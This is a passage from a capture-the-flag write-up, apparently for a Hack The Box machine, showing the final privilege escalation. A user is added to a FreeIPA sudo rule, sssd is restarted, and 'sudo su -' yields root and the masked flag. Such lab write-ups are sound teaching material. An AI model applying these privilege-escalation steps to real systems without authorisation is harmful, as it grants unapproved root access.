Number of members added 1
-------------------------
```

Exit out and ssh again to `ash_winter` user.

Then we need to add `ash_winter` to `allow_sudo` `sudorule`.

```bash
ash_winter@main:~$ ipa sudorule-add-user allow_sudo --users=ash_winter
  Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
  Users: admin, ash_winter
-------------------------
Number of members added 1
-------------------------
```

Again the exit and ssh process.

Then restart the `sssd` service.

```bash
ash_winter@main:~$ sudo /usr/bin/systemctl restart sssd
```

Also again the exit and ssh process.

Now we can escalate to `root`.

```bash
ash_winter@main:~$ sudo su -
[sudo] password for ash_winter:
root@main:~# ls -la
total 64
drwx------  7 root root 4096 Jun 17 12:46 .
drwxr-xr-x 25 root root 4096 Apr 28 12:11 ..
lrwxrwxrwx  1 root root    9 Sep 18  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  4 root root 4096 Mar 19 14:52 .cache
drwx------  3 root root 4096 Oct 30  2024 .docker
drwxr-xr-x  3 root root 4096 Oct 30  2024 .ipa
-rw-------  1 root root   20 Jun 14 20:00 .lesshst
drwxr-xr-x  3 root root 4096 Mar 19 15:16 .local
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
-rw-r--r--  1 root root   66 Apr 24 13:01 .selected_editor
drwx------  2 root root 4096 Sep 18  2024 .ssh
-rw-------  1 root root 9658 Mar 31 17:56 .viminfo
-rw-r--r--  1 root root  165 Apr 28 13:22 .wget-hsts
-rw-r-----  1 root root   33 Jun 17 12:46 root.txt
root@main:~# cat root.txt
5d679cxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Pwned the `root.txt` flag.

What an **insane** machine! But for me, it was so **brainfuck** to solve this machine. <br>

![result](/assets/img/sorcery-htb-season8/result.png)